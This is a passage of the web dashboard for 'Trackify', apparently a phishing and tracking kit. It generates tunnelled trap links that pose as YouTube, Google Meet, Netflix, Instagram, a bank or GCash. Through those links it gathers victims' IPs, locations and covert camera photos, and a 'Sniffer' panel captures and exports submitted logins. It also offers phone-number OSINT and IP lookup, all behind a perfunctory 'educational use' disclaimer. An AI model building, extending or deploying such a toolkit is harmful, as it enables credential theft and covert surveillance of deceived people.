            display: grid;
            grid-template-columns: minmax(120px, 32%) 1fr;
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid rgba(48,54,61,0.5);
        }
        .ip-lookup-extra-row:last-child {
            border-bottom: none;
        }
        @media (max-width: 720px) {
            .ip-lookup-pair-row {
                grid-template-columns: 1fr;
            }
            .ip-lookup-half {
                border-right: none;
                border-bottom: 1px solid var(--border);
            }
            .ip-lookup-half:last-child {
                border-bottom: none;
            }
        }
        .ip-lookup-map {
            height: 380px;
            border-radius: 10px;
            border: 1px solid var(--border);
            overflow: hidden;
            background: var(--bg-input);
        }
        .ip-lookup-map.ip-lookup-map--empty {
            height: auto;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            font-size: 13px;
            padding: 24px;
            text-align: center;
        }
        .top-nav {
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid var(--border);
            background: linear-gradient(90deg, rgba(13,17,23,0.98), rgba(13,17,23,0.9));
        }
        .top-nav-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .top-nav-hamburger {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            border: 1px solid rgba(48, 54, 61, 0.9);
            background: rgba(22, 27, 34, 0.65);
            color: var(--text);
            display: none;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s, transform 0.15s;
        }
        .top-nav-hamburger:hover {
            background: rgba(22, 27, 34, 0.9);
            border-color: rgba(88, 166, 255, 0.55);
            transform: translateY(-1px);
        }
        .top-nav-hamburger:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 3px;
        }
        .side-nav-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.56);
            backdrop-filter: blur(2px);
            z-index: 999;
            display: none;
        }
        .side-nav-overlay.is-open {
            display: block;
        }
        @media (max-width: 820px) {
            .top-nav { padding: 0 14px; }
            .top-nav-left { gap: 10px; }
            .top-nav-hamburger { display: inline-flex; }
            .side-nav {
                position: fixed;
                top: 0;
                left: 0;
                height: 100vh;
                transform: translateX(-110%);
                transition: transform 0.18s ease;
                z-index: 1000;
                box-shadow: 0 18px 45px rgba(0,0,0,0.6);
            }
            .side-nav.is-open {
                transform: translateX(0);
            }
        }
    </style>
</head>
<body>
    <div class="app-shell">
        <nav class="side-nav" aria-label="Main navigation">
            <button type="button" class="side-nav-logo" onclick="switchView('trackify')" title="Trackify — Home" aria-label="Trackify — Home">
                <img src="logos/trackify_logo.png" width="120" height="48" alt="">
            </button>
            <button type="button" class="side-nav-item active" id="navItemTrackify" onclick="switchView('trackify')" title="Trackify">
                🛰
            </button>
            <button type="button" class="side-nav-item" id="navItemPhone" onclick="switchView('phone')" title="Phone Number Look Up">
                ☎
            </button>
            <button type="button" class="side-nav-item" id="navItemIp" onclick="switchView('ip')" title="IP Lookup">
                🌐
            </button>
            <button type="button" class="side-nav-item" id="navItemSaveInfo" onclick="switchView('saveinfo')" title="Sniffer">
                🔑
            </button>
            <div class="side-nav-spacer" aria-hidden="true"></div>
            <a href="account-settings.php" class="side-nav-item" title="Account settings">⚙</a>
            <div class="side-nav-disclaimer-wrap">
                <button type="button" class="disclaimer-link disclaimer-link--rail" onclick="openDisclaimer()" title="Disclaimer" aria-label="Disclaimer">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
                </button>
            </div>
        </nav>
        <div class="side-nav-overlay" id="sideNavOverlay" aria-hidden="true"></div>

        <div style="flex:1;display:flex;flex-direction:column;min-height:100vh;">
            <header class="top-nav">
                <div class="top-nav-left">
                    <button type="button" class="top-nav-hamburger" id="sideNavToggle" aria-label="Open menu" aria-controls="sideNavOverlay" aria-expanded="false">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
                            <path d="M4 6h16M4 12h16M4 18h16"/>
                        </svg>
                    </button>
                    <button type="button" class="top-nav-brand" onclick="switchView('trackify')" title="Trackify" aria-label="Trackify">
                        <img src="logos/trackify_logo.png" width="220" height="48" alt="Trackify">
                    </button>
                </div>
                <div class="user-nav" id="userNav">
                    <button type="button" class="user-nav-trigger" id="userNavTrigger" aria-expanded="false" aria-haspopup="true" aria-controls="userNavMenu">
                        <span class="user-nav-avatar" aria-hidden="true"><?= h($userNavInitial) ?></span>
                        <span class="user-nav-name"><?= h($userNavName) ?></span>
                        <svg class="user-nav-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
                    </button>
                    <div class="user-nav-dropdown" id="userNavMenu" role="menu" hidden>
                        <a href="account-settings.php" class="user-nav-item" role="menuitem">Account settings</a>
                        <a href="logout.php" class="user-nav-item user-nav-item--danger" role="menuitem">Log out</a>
                    </div>
                </div>
            </header>

        <div id="trackifyLayout" class="layout">
        <main class="main">
            <div class="card">
                <h2>Generate Tracker Link</h2>
                <p class="subtitle card-view-desc">Trackify is a tracker-link platform with advanced analytics for traffic through your generated URLs—see IPs, locations, camera captures, and live events as visitors move through your pages.</p>
                <label>Template</label>
                <select id="template">
                    <option value="1">YouTube Live</option>
                    <option value="2" selected>Google Meet</option>
                    <option value="3">Sensitive (Age Verification)</option>
                    <option value="4">Netflix</option>
                    <option value="5">Instagram</option>
                    <option value="6">Bank</option>
                    <option value="7">GCash</option>
                </select>
                <div id="ytVideoIdWrap" style="display:none">
                    <label>YouTube Video ID</label>
                    <input type="text" id="ytVideoId" placeholder="dQw4w9WgXcQ" value="dQw4w9WgXcQ">
                </div>
                <button type="button" class="btn btn-primary btn-generate" id="generateBtn" onclick="generateLink()">
                    <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                    <span>Generate</span>
                </button>
                <div id="tunnelControlsWrap" class="tunnel-controls-wrap" style="display:none">
                    <div id="linkBox" class="link-box">
                        <div id="trackerLinkGroup" class="tunnel-link-group">
                            <input type="text" class="link-input" id="trackerLink" readonly>
                            <button type="button" class="btn btn-secondary" onclick="copyLink()">Copy</button>
                        </div>
                        <button type="button" class="btn btn-danger" id="stopBtn" onclick="stopService()" style="display:none">Stop tunnel</button>
                    </div>
                </div>
            </div>

            <div class="card card-terminal-panel">
                <div class="terminal-card-head">
                    <h2>Terminal</h2>
                    <span class="terminal-card-badge" aria-hidden="true">Live</span>
                </div>
                <div class="phone-lookup-terminal" id="terminal">
                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Waiting for targets, Press Ctrl + C to exit...</div>
                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                </div>
            </div>
        </main>

        <section class="gallery-section">
            <div class="card gallery-panel-head">
                <div class="gallery-header-top">
                    <h2 class="gallery-title">Image Captures</h2>
                    <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
                </div>
                <div class="gallery-toolbar" id="galleryToolbar">
                    <label class="gallery-toolbar-label">
                        <input type="checkbox" id="gallerySelectAll" title="Select all on this page">
                        Select page
                    </label>
                    <button type="button" class="gallery-btn danger" id="galleryBulkDelete" disabled>Delete selected</button>
                </div>
                <div id="captureQuotaBanner" class="capture-quota-banner" style="display:none" role="status" aria-live="polite"></div>
            </div>
            <div id="galleryGrid" class="gallery-grid">
                <div class="gallery-empty" id="galleryEmpty">
                    <div class="gallery-empty-icon">📷</div>
                    <div class="gallery-empty-title">No captures yet</div>
                    <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                    <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                </div>
            </div>
            <div id="pagination" class="pagination" style="display:none">
                <button class="pagination-btn" id="prevBtn" onclick="loadPhotos(currentPage - 1)">← Prev</button>
                <span class="pagination-info" id="paginationInfo">Page 1 of 1</span>
                <button class="pagination-btn" id="nextBtn" onclick="loadPhotos(currentPage + 1)">Next →</button>
            </div>
        </section>

        <aside class="sidebar">
            <div class="card trackify-only">
                <h2>Status</h2>
                <div id="statusDisplay">
                    <span class="status-badge inactive">Tunnel inactive</span>
                </div>
                <p id="statusLink" style="margin-top:12px;font-size:12px;color:var(--text-muted);word-break:break-all"></p>
                <button class="btn btn-danger" id="stopBtnSidebar" onclick="stopService()" style="display:none;width:100%;margin-top:12px">Stop Tunnel</button>
            </div>
            <div class="card trackify-only">
                <div class="card-header-row">
                    <h2>Recent Captures</h2>
                    <button type="button" class="mini-btn" id="clearCapturesBtn" onclick="clearCaptures()">Clear Captures</button>
                </div>
                <div id="capturesList" class="captures-list">
                    <div class="empty-state">No captures yet</div>
                </div>
            </div>
            <div class="card trackify-only">
                <h2>Quick Links</h2>
                <a href="map.php" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none;margin-bottom:8px">View Map</a>
                <a href="api.php?action=captures" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none">API (JSON)</a>
            </div>
        </aside>
        </div>

        <section id="phoneLayout" class="phone-layout" aria-label="Phone number lookup view">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div class="card">
                        <h2>Phone Number Lookup</h2>
                        <p class="subtitle card-view-desc">Phone Lookup is a recon assistant with advanced shortcuts for numbers you investigate—turn a single input into OSINT URLs, social search links, and a scan history you can revisit anytime.</p>
                        <div class="phone-lookup-input-wrap">
                            <label for="phoneLookupInput">Phone number</label>
                            <input type="text" id="phoneLookupInput" placeholder="09XXXXXXXXX or +63XXXXXXXXXX">
                        </div>
                        <div id="phoneLookupError" class="phone-lookup-error" role="alert" hidden></div>
                        <div class="phone-lookup-actions">
                            <button class="btn btn-secondary" type="button" onclick="performPhoneLookup()">Scan</button>
                        </div>
                        <div id="phoneLookupResults" class="phone-lookup-results" aria-live="polite">
                            <div class="phone-lookup-terminal">
                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Enter a phone number on the left and press <span class="link">Scan</span> to generate OSINT URLs.</div>
                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                            </div>
                        </div>
                    </div>
                    <div class="phone-history">
                        <div class="phone-history-title">Scan History</div>
                        <div id="phoneHistoryList" class="phone-history-list">
                            <div class="phone-history-item">
                                <div class="phone-history-meta">No scans yet. Run your first lookup to populate history.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="ipLayout" class="phone-layout" style="display:none" aria-label="IP lookup view">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div class="card">
                        <h2>IP Lookup</h2>
                        <p class="subtitle card-view-desc">IP Lookup is a network intelligence view with advanced analytics for addresses you query—IPv4 or IPv6 geolocation, provider details, and an optional map when coordinates are returned.</p>
                        <div class="phone-lookup-input-wrap">
                            <label for="ipLookupInput">IP address</label>
                            <input type="text" id="ipLookupInput" placeholder="e.g. 8.8.8.8 or 2001:4860:4860::8888" autocomplete="off">
                        </div>
                        <div id="ipLookupError" class="phone-lookup-error" role="alert" hidden></div>
                        <div class="phone-lookup-actions">
                            <button type="button" class="btn btn-secondary" onclick="performIpLookup()">Lookup</button>
                        </div>
                        <div id="ipLookupTerminal" class="phone-lookup-results" aria-live="polite">
                            <div class="phone-lookup-terminal">
                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Enter an IPv4 or IPv6 address and press <span class="link">Lookup</span>.</div>
                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                            </div>
                        </div>
                    </div>
                    <div>
                        <div class="card">
                            <h2>Details</h2>
                            <div id="ipLookupDetails" class="ip-lookup-details">
                                <p style="margin:0;color:var(--text-muted);font-size:13px">Run a lookup to see IP details.</p>
                            </div>
                        </div>
                        <div class="card" style="margin-top:20px">
                            <h2>Map</h2>
                            <div id="ipLookupMap" class="ip-lookup-map ip-lookup-map--empty">No location yet. Coordinates appear here when FindIP returns latitude/longitude.</div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Sniffer">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns phone-layout-columns--saveinfo">
                    <div class="save-info-stack">
                        <div class="card">
                            <h2>Sniffer</h2>
                            <p class="subtitle card-view-desc" style="color:var(--text-muted)">
                                Sniffer is a themed capture flow with advanced handling for traffic through your Sniffer links—pick a template, publish over your tunnel, and review stored submissions (up to <span id="savedInfoMax">500</span>) with export in one place.
                            </p>
                            <div class="phone-lookup-input-wrap">
                                <label for="siTemplate">Template</label>
                                <select id="siTemplate">
                                    <option value="">Loading templates…</option>
                                </select>
                            </div>
                            <div id="siTemplateHint" class="phone-lookup-error" style="margin-top:8px;border:none;padding:0;color:var(--text-muted);font-size:13px" hidden></div>
                            <div class="phone-lookup-actions" style="margin-top:16px">
                                <button type="button" class="btn btn-primary btn-generate" id="siGenerateBtn" onclick="generateSaveInfoLink()">
                                    <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                                    <span>Generate</span>
                                </button>
                            </div>
                            <div id="siLinkBox" class="link-box" style="display:none;margin-top:16px">
                                <input type="text" class="link-input" id="siTrackerLink" readonly>
                                <button type="button" class="btn btn-secondary" onclick="copySaveInfoLink()">Copy</button>
                                <button type="button" class="btn btn-danger" id="siStopBtn" onclick="stopService()">Stop</button>
                            </div>
                        </div>
                        <div class="card card-terminal-panel">
                            <div class="terminal-card-head">
                                <h2>Terminal</h2>
                                <span class="terminal-card-badge terminal-card-badge--saveinfo" aria-hidden="true">Sniffer</span>
                            </div>
                            <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:0" aria-live="polite">
                                <div class="phone-lookup-terminal" id="saveInfoTerminal">
                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Sniffer tunnel log (same Cloudflare tunnel as Trackify when shared).</div>
                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:sniffer# </span><span class="terminal-cursor"></span></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="phone-history">
                        <div class="card saved-logins-card">
                            <div class="saved-logins-card-head">
                                <h2>Captured logins</h2>
                                <span class="saved-logins-count" id="savedInfoCountMeta" aria-live="polite"></span>
                            </div>
                            <div class="saved-logins-toolbar">
                                <button type="button" class="btn btn-secondary" id="exportSavedInfoBtn" onclick="exportSavedInfoCsv()" disabled>Export CSV</button>
                                <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()">Clear all</button>
                            </div>
                            <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
                                <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Sniffer link and submit the trap page form.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <div class="lightbox" id="lightbox" onclick="closeLightbox()" role="dialog" aria-modal="true" aria-label="Full size capture">
        <button type="button" class="lightbox-close" onclick="event.stopPropagation(); closeLightbox();" aria-label="Close">×</button>
        <img id="lightboxImg" src="" alt="Capture full size" onclick="event.stopPropagation()">
    </div>

    <div class="toast" id="toast">Copied to clipboard!</div>

    <div class="modal-overlay" id="disclaimerModal" onclick="closeDisclaimer(event)">
        <div class="modal-content" onclick="event.stopPropagation()">
            <h2 class="modal-title">Disclaimer</h2>
            <div class="modal-body">
                <p>This tool is intended for educational and authorized security testing purposes only.</p>
                <p>Use of this software to track, monitor, or collect information from individuals without their explicit consent may violate privacy laws and regulations in your jurisdiction.</p>
                <p>You are solely responsible for ensuring your use complies with all applicable laws. The developers assume no liability for misuse of this software.</p>
            </div>
            <button class="modal-close" onclick="closeDisclaimer()">I Understand</button>
        </div>
    </div>

    <div class="support-float" aria-live="polite">
        <div class="support-prompt" id="supportPrompt">
            If you want to support this project and help continue development, you can support me on Ko-fi.
            <div class="support-prompt-actions">
                <a class="support-link-btn" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer">Support on Ko-fi</a>
                <button type="button" class="support-dismiss-btn" id="supportContinueBtn">Continue</button>
            </div>
        </div>
        <a class="support-fab" href="https://ko-fi.com/0cod3" target="_blank" rel="noopener noreferrer" aria-label="Support this project on Ko-fi">
            ☕ Support on Ko-fi
        </a>
    </div>

    <script>
        const API = 'api.php';

        function escapeHtmlAttr(s) {
            return String(s)
                .replace(/&/g, '&amp;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#39;');
        }

        const terminalEl = document.getElementById('terminal');
        const saveInfoTerminalEl = document.getElementById('saveInfoTerminal');
        const linkBox = document.getElementById('linkBox');
        const tunnelControlsWrap = document.getElementById('tunnelControlsWrap');
        const trackerLinkInput = document.getElementById('trackerLink');

        function syncTrackifyTunnelRow(link, showStop) {
            const wrap = tunnelControlsWrap || document.getElementById('tunnelControlsWrap');
            const box = linkBox || document.getElementById('linkBox');
            const stopBtnEl = document.getElementById('stopBtn');
            if (!wrap || !box) {
                return;
            }
            const hasLink = !!(link && String(link).trim());
            if (!hasLink && !showStop) {
                wrap.style.display = 'none';
                box.style.display = 'none';
                box.classList.remove('link-box--stop-only');
                if (stopBtnEl) {
                    stopBtnEl.style.display = 'none';
                }
                return;
            }
            wrap.style.display = 'block';
            box.style.display = 'flex';
            box.classList.toggle('link-box--stop-only', !hasLink && showStop);
            if (stopBtnEl) {
                stopBtnEl.style.display = showStop ? 'inline-flex' : 'none';
            }
        }
        const generateBtn = document.getElementById('generateBtn');
        const GENERATE_BTN_IDLE_HTML = '<svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg><span>Generate</span>';
        const SI_GENERATE_BTN_IDLE_HTML = GENERATE_BTN_IDLE_HTML;
        const statusDisplay = document.getElementById('statusDisplay');
        const statusLink = document.getElementById('statusLink');
        const capturesList = document.getElementById('capturesList');
        let currentPage = 1;
        let lastSavedInfoEntries = [];

        async function syncPayloadOptions() {
            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');
            try {
                const res = await fetch(API + '?action=update_payload', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status === 'success' && data.regenerated && data.payload_ok === false) {
                    addTerminalLine('[!] Template files not updated — check write permission on trap-*.html / index.php', 'dim');
                }
            } catch (e) {}
        }

        document.getElementById('template').addEventListener('change', function() {
            document.getElementById('ytVideoIdWrap').style.display = this.value === '1' ? 'block' : 'none';
            syncPayloadOptions();
        });

        document.getElementById('ytVideoId').addEventListener('change', function() {
            syncPayloadOptions();
        });

        async function loadSaveInfoTemplates() {
            const sel = document.getElementById('siTemplate');
            const hint = document.getElementById('siTemplateHint');
            if (!sel) {
                return;
            }
            try {
                const res = await fetch(API + '?action=saveinfo_templates', { credentials: 'same-origin' });
                const data = await res.json().catch(() => ({}));
                if (data.status !== 'success' || !Array.isArray(data.templates)) {
                    sel.innerHTML = '<option value="">Could not load templates</option>';
                    return;
                }
                const prev = sel.value;
                sel.innerHTML = '';
                let n = 0;
                data.templates.forEach(function (t) {
                    if (!t.readable) {
                        return;
                    }
                    const o = document.createElement('option');
                    o.value = t.slug;
                    o.textContent = t.label;
                    sel.appendChild(o);
                    n++;
                });
                if (n === 0) {
                    sel.innerHTML = '<option value="">No templates found</option>';
                    if (hint) {
                        hint.hidden = false;
                        hint.textContent = 'Add .html files under saveinfo-templates/ and register them in api.php (saveinfo_templates_registry).';
                    }
                    return;
                }
                if (hint) {
                    hint.hidden = true;
                }
                const hasOpt = function (val) {
                    return val && Array.prototype.some.call(sel.options, function (o) { return o.value === val; });
                };
                let pick = null;
                if (hasOpt(data.active_template)) {
                    pick = data.active_template;
                } else if (hasOpt(prev)) {
                    pick = prev;
                } else if (sel.options[0] && sel.options[0].value) {
                    pick = sel.options[0].value;
                }
                if (pick) {
                    sel.value = pick;
                }
                await syncSaveInfoPayload({ silent: true });
            } catch (e) {
                sel.innerHTML = '<option value="">Load failed</option>';
            }
        }

        async function syncSaveInfoPayload(options) {
            const silent = options && options.silent;
            const sel = document.getElementById('siTemplate');
            if (!sel || !sel.value) {
                return;
            }
            const formData = new FormData();
            formData.append('template', sel.value);
            try {
                const res = await fetch(API + '?action=saveinfo_update_payload', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const data = await res.json().catch(() => ({}));
                if (data.status === 'success') {
                    if (data.regenerated && data.payload_ok && !silent) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + data.template + '" is live. Re-open your Sniffer URL or hard-refresh the trap page (Ctrl+F5).', 'green');
                    }
                    if (data.regenerated && data.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Sniffer template files not updated — check saveinfo-templates/ and saveinfo_entry.php permissions', 'dim');
                    }
                } else if (data.status === 'error' && data.message && !silent) {
                    const skip = 'Generate a Sniffer link first';
                    if (String(data.message).indexOf(skip) === -1) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] ' + data.message, 'dim');
                    }
                }
            } catch (e) {}
        }

        document.getElementById('siTemplate').addEventListener('change', function() {
            syncSaveInfoPayload({ silent: false });
        });

        function addTerminalLineTo(rootEl, text, cls) {
            if (!rootEl) {
                return;
            }
            const line = document.createElement('div');
            line.className = 'phone-lookup-terminal-line' + (cls ? ' ' + cls : '');
            line.textContent = '  ' + text;
            const prompt = rootEl.querySelector('.phone-lookup-terminal-line:last-child');
            if (prompt) {
                rootEl.insertBefore(line, prompt);
            } else {
                rootEl.appendChild(line);
            }
            rootEl.scrollTop = rootEl.scrollHeight;
        }

        function addTerminalLine(text, cls) {
            addTerminalLineTo(terminalEl, text, cls == null ? '' : cls);
        }

        function appendTerminalEventToRoot(rootEl, ev) {
            if (!rootEl) {
                return;
            }
            if (ev.type === 'location') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] New Target Opened the Link!', 'green');
                ev.content.split('\n').forEach(function (l) {
                    if (l.trim()) {
                        addTerminalLineTo(rootEl, l, 'cyan');
                    }
                });
            } else if (ev.type === 'ip') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] Target opened the link!', 'green');
                ev.content.split('\n').forEach(function (l) {
                    if (l.trim()) {
                        addTerminalLineTo(rootEl, l, 'cyan');
                    }
                });
            } else if (ev.type === 'photo') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] Victim\'s Photo Received!', 'green');
            } else if (ev.type === 'saved_login') {
                addTerminalLineTo(rootEl, '', 'green');
                addTerminalLineTo(rootEl, '[+] ' + ev.content, 'green');
            }
        }

        async function generateLink() {
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<span>Starting tunnel...</span>';
            addTerminalLine('[+] Starting Cloudflare tunnel...', 'yellow');
            addTerminalLine('[+] Starting php server... (localhost:8000)', 'yellow');

            const formData = new FormData();
            formData.append('template', document.getElementById('template').value);
            formData.append('yt_video_id', document.getElementById('ytVideoId').value || 'dQw4w9WgXcQ');

            try {
                const startRes = await fetch(API + '?action=start', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const startData = await startRes.json().catch(() => ({}));
                if (startData.status === 'error') {
                    addTerminalLine('[!] ' + (startData.message || 'Start failed'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    return;
                }
            } catch (e) {
                addTerminalLine('[!] Error: ' + e.message, 'dim');
                generateBtn.disabled = false;
                generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                return;
            }

            addTerminalLine('[+] Waiting for Cloudflare tunnel link...', 'yellow');
            pollForLink();
        }

        async function pollForLink() {
            let lastExcerpt = '';
            for (let i = 0; i < 90; i++) {
                await new Promise(r => setTimeout(r, 1000));
                const res = await fetch(API + '?action=link', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.tunnel_log_excerpt) {
                    lastExcerpt = data.tunnel_log_excerpt;
                }
                if (data.status === 'forbidden' || data.status === 'error') {
                    addTerminalLine('[!] ' + (data.message || 'Could not claim tunnel for your account'), 'dim');
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    return;
                }
                if (data.link) {
                    if (data.payload_ok === false) {
                        addTerminalLine('[!] Tunnel is up but trap-*.html was not written — fix permissions on the project root', 'dim');
                    } else if (data.template_id != null) {
                        addTerminalLine('[+] Template #' + data.template_id + ' → /' + (data.trap_file || 'trap-?.html') + ' (if wrong page: hard refresh or private window)', 'dim');
                    }
                    trackerLinkInput.value = data.link;
                    syncTrackifyTunnelRow(data.link, true);
                    addTerminalLine('', 'green');
                    addTerminalLine('[+] Tracker Link: ' + data.link, 'green');
                    addTerminalLine('', 'green');
                    addTerminalLine('[*] Waiting for targets, Press Ctrl + C to exit...', 'yellow');
                    statusDisplay.innerHTML = '<span class="status-badge active">Tunnel active</span>';
                    statusLink.textContent = data.link;
                    document.getElementById('stopBtnSidebar').style.display = 'block';
                    generateBtn.disabled = false;
                    generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
                    loadPhotos(1);
                    loadCaptures();
                    checkStatus();
                    return;
                }
            }
            addTerminalLine('[!] Timeout: Could not get tunnel link (waited 90s).', 'dim');
            if (lastExcerpt) {
                addTerminalLine('[!] cloudflared log: ' + lastExcerpt, 'dim');
            } else {
                addTerminalLine('[!] Install cloudflared, confirm tunnel_origin in config.php reaches your PHP server, and that this machine can reach Cloudflare.', 'dim');
            }
            generateBtn.disabled = false;
            generateBtn.innerHTML = GENERATE_BTN_IDLE_HTML;
        }

        async function generateSaveInfoLink() {
            const siBtn = document.getElementById('siGenerateBtn');
            if (!siBtn) {
                return;
            }
            siBtn.disabled = true;
            siBtn.innerHTML = '<span>Starting tunnel...</span>';
            addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer: starting or reusing Cloudflare tunnel...', 'yellow');

            const siSel = document.getElementById('siTemplate');
            const slug = siSel && siSel.value;
            if (!slug) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] Select a Sniffer template first.', 'dim');
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                return;
            }

            const formData = new FormData();
            formData.append('template', slug);

            try {
                const startRes = await fetch(API + '?action=saveinfo_start', {
                    method: 'POST',
                    body: formData,
                    credentials: 'same-origin'
                });
                const startData = await startRes.json().catch(() => ({}));
                if (startData.status === 'error') {
                    addTerminalLineTo(saveInfoTerminalEl, '[!] ' + (startData.message || 'Start failed'), 'dim');
                    siBtn.disabled = false;
                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    return;
                }
                if (startData.status === 'ready' && startData.link) {
                    const siLinkBox = document.getElementById('siLinkBox');
                    const siInput = document.getElementById('siTrackerLink');
                    const siStop = document.getElementById('siStopBtn');
                    if (startData.reused_tunnel) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Reusing existing tunnel.', 'yellow');
                    }
                    if (startData.payload_ok === false) {
                        addTerminalLineTo(saveInfoTerminalEl, '[!] Tunnel OK but saveinfo trap files were not written — check project permissions', 'dim');
                    } else if (startData.template_slug) {
                        addTerminalLineTo(saveInfoTerminalEl, '[+] Template "' + startData.template_slug + '" → /' + (startData.trap_file || 'saveinfo-trap-?.html'), 'dim');
                    }
                    if (siLinkBox) {
                        siLinkBox.style.display = 'flex';
                    }
                    if (siInput) {
                        siInput.value = startData.link;
                    }
                    if (siStop) {
                        siStop.style.display = 'inline-flex';
                    }
                    addTerminalLineTo(saveInfoTerminalEl, '', 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[+] Sniffer URL: ' + startData.link, 'green');
                    addTerminalLineTo(saveInfoTerminalEl, '[*] Share this Sniffer URL (not the site root).', 'yellow');
                    siBtn.disabled = false;
                    siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                    checkStatus();
                    return;
                }
            } catch (e) {
                addTerminalLineTo(saveInfoTerminalEl, '[!] Error: ' + e.message, 'dim');
                siBtn.disabled = false;
                siBtn.innerHTML = SI_GENERATE_BTN_IDLE_HTML;
                return;
            }

            addTerminalLineTo(saveInfoTerminalEl, '[+] Waiting for tunnel URL...', 'yellow');
            pollForSaveInfoLink();
        }

        async function pollForSaveInfoLink() {
            const siBtn = document.getElementById('siGenerateBtn');
            let lastExcerpt = '';
            for (let i = 0; i < 90; i++) {
                await new Promise(function (r) { setTimeout(r, 1000); });
                const res = await fetch(API + '?action=saveinfo_link', { credentials: 'same-origin' });
                const data = await res.json();
                if (data.tunnel_log_excerpt) {
